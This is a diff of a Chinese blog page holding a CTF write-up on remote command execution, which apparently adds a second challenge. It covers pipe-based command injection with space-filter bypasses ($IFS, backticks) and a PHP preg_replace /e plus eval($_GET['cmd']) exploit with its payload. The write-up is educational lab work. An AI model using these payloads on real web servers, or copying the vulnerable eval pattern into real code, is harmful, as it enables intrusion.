@@ -8,15 +8,15 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>RCE | jjzdxmd&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="RCE写在前面做了几道RCE的题目只有一个感受：mdRCE好难 包含题目 [GXYCTF2019]Ping Ping Ping   [GXYCTF2019]Ping Ping Ping打开题目发现只有一个?ip&#x3D;,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下 1&#x2F;?ip&#x3D;1|ls 发现回显flag.php和index.php直接">
+  <meta name="description" content="RCE写在前面做了几道RCE的题目只有一个感受：mdRCE好难 包含题目 [GXYCTF 2019]Ping Ping Ping [BJDCTF 2020]ZJCTF，不过如此  [GXYCTF 2019]Ping Ping Ping打开题目发现只有一个?ip&#x3D;,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下 1&#x2F;?ip&#x3D;1|ls">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCE">
 <meta property="og:url" content="http://example.com/2022/02/08/RCE/index.html">
 <meta property="og:site_name" content="jjzdxmd&#39;s Blog">
-<meta property="og:description" content="RCE写在前面做了几道RCE的题目只有一个感受：mdRCE好难 包含题目 [GXYCTF2019]Ping Ping Ping   [GXYCTF2019]Ping Ping Ping打开题目发现只有一个?ip&#x3D;,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下 1&#x2F;?ip&#x3D;1|ls 发现回显flag.php和index.php直接">
+<meta property="og:description" content="RCE写在前面做了几道RCE的题目只有一个感受：mdRCE好难 包含题目 [GXYCTF 2019]Ping Ping Ping [BJDCTF 2020]ZJCTF，不过如此  [GXYCTF 2019]Ping Ping Ping打开题目发现只有一个?ip&#x3D;,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下 1&#x2F;?ip&#x3D;1|ls">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-08T07:37:28.000Z">
-<meta property="article:modified_time" content="2022-02-10T16:08:40.949Z">
+<meta property="article:modified_time" content="2022-02-11T07:40:43.420Z">
 <meta property="article:author" content="jjzdxmd">
 <meta property="article:tag" content="记录">
 <meta name="twitter:card" content="summary">
@@ -159,10 +159,10 @@
       
         <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>做了几道RCE的题目只有一个感受：mdRCE好难</p>
 <h2 id="包含题目"><a href="#包含题目" class="headerlink" title="包含题目"></a>包含题目</h2><ol>
-<li>[GXYCTF2019]Ping Ping Ping</li>
-<li></li>
+<li>[GXYCTF 2019]Ping Ping Ping</li>
+<li>[BJDCTF 2020]ZJCTF，不过如此</li>
 </ol>
-<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>打开题目发现只有一个?ip=,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下</p>
+<h3 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h3><p>打开题目发现只有一个?ip=,显然是要get一个IP，传入127.0.0.1，发现传回来一个PING的页面，猜测可能是RCE。利用管道符测试一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=1|ls</span><br></pre></td></tr></table></figure>
 <p>发现回显flag.php和index.php<br>直接cat一下flag.php(虽然估计读不出来。。。)。果然发现fxck your space!<br>绕过空格的方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
@@ -176,6 +176,20 @@
 <h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>内联执行，Linux的shell中``反引号中的内容会被当作Linux命令先执行，再将执行结果返回给调用它的变量或其他<br>构建payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1|cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
 <h4 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h4><p>变量拼接，原理就是把过滤了的关键字拆开。从而到达绕过的目的</p>
+<h3 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h3><p>前面和ZJCTF一模一样具体可以参考序列化的那篇文章。这里就不细说。拿到next.php的源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后有一个eval函数。可以想到是命令执行。而需要绕过的部分就是complex函数。这里要补充三个知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. preg_replace使用/e模式，会把replacement参数当作php代码执行，是一个典型的远程代码执行函数</span><br><span class="line">2. 当正则表达式使用括号把要匹配的内容括起来时，匹配到的字符串会放到一个缓冲区内，最多可以存放99个字符串，可以使用\n来访问这些字符串，n是序号从1开始</span><br><span class="line">3. 在bash中单引号内的变量不会做替换，单纯的当作字符串。而双引号内的变量会先做替换。</span><br></pre></td></tr></table></figure>
+<p>于是构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+<p>一点一点解释这个payload。首先是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;getFlag()&#125;。实际上是get了一个变量名为\S*,值为$&#123;getflag()&#125;的一组变量，经过拆分以后放到complex函数里面就变成了</span><br><span class="line">preg_replace(&#x27;/(\S*)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$&#123;getFlag()&#125;),\S*匹配所有非空白字符，即匹配到的结果是$&#123;getFlag()&#125;,$&#123;getFlag()&#125;会被放到缓冲区里。</span><br></pre></td></tr></table></figure>
+<p>然后谈谈怎么就被调用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意&#x27;strtolower(&quot;\\1&quot;)&#x27;,这里的\\1，第一个反斜杠转义，第二个反斜杠才是真正的反斜，\\1访问了位于缓冲区的$&#123;getFlag()&#125;，而且在双引号变量内会被替换，实际上变成了&#x27;strtolower(getFlag())&#x27;,由于preg_replace开启了/e,strtolower(getFlag())会被当作php代码执行。</span><br></pre></td></tr></table></figure>
+<p>最后一个知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么是$&#123;getFlag()&#125;?  在bash中，变量的引用需要在变量名之前加$,标准的是$&#123;&#125;,代表$&#123;&#125;里的东西是一个变量，而不是单纯的字符串</span><br></pre></td></tr></table></figure>
+<p>更多关于bash中的变量细节可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42432281/article/details/88392219">Linux下shell脚本：bash的介绍和使用（详细）</a><br>因此最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
 
       
 
